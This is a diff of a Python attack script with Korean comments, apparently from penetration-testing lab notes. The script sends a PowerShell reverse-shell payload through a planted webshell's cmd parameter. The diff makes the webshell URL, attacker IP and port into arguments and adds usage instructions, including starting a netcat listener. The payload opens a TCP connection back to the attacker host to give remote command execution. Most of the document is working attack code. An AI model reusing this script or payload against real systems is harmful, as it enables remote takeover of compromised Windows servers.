@@ -2,13 +2,35 @@ import sys
 
 import requests
 
-# 타겟 웹셸 주소
-url = "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php"
+# cmd= GET 파라미터 웹셸에 PowerShell 리버스 셸 페이로드를 전송하는 스크립트.
+#
+# 사용법:
+#   python3 send_powershell_reverse_shell_via_webshell.py <웹셸 URL> <공격자 IP> <리스너 포트>
+# 예:
+#   python3 send_powershell_reverse_shell_via_webshell.py \
+#       http://10.10.20.5/blog/uploads/shell.php 10.10.10.10 443
+#
+# 사전 준비:
+#   - 의존성: apt install python3-requests
+#   - 공격자에서 리스너를 먼저 띄운다: rlwrap nc -lvnp <리스너 포트>
+#
+# 참고:
+#   - 응답이 timeout 으로 떨어지는 것은 셸이 붙어 요청이 끝나지 않기 때문이다. 정상이다.
+#   - PowerShell 페이로드 본문은 [windows_powershell_reverse_shell.md](../windows_powershell_reverse_shell.md) 참고.
 
-# 실행할 파워셸 리버스 쉘 페이로드 (Revshells 원본)
+if len(sys.argv) != 4:
+    print(
+        "사용법: python3 send_powershell_reverse_shell_via_webshell.py "
+        "<웹셸 URL> <공격자 IP> <리스너 포트>"
+    )
+    sys.exit(1)
+
+url, lhost, lport = sys.argv[1], sys.argv[2], sys.argv[3]
+
+# PowerShell 리버스 셸 페이로드 (Revshells 원본)
 powershell_payload = (
-    '$LHOST = "192.168.45.156"; '
-    "$LPORT = 1234; "
+    '$LHOST = "' + lhost + '"; '
+    "$LPORT = " + lport + "; "
     "$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); "
     "$NetworkStream = $TCPClient.GetStream(); "
     "$StreamReader = New-Object IO.StreamReader($NetworkStream); "
@@ -38,7 +60,7 @@ full_command = f'powershell -nop -c "{powershell_payload}"'
 # URL 파라미터 전달
 params = {"cmd": full_command}
 
-print("[*] 공격자 리스너(nc -lvnp 443)가 켜져 있는지 확인하세요.")
+print("[*] 공격자 리스너(rlwrap nc -lvnp <포트>)가 켜져 있는지 확인하세요.")
 print("[*] 페이로드를 웹셸로 전송합니다...")
 
 try:
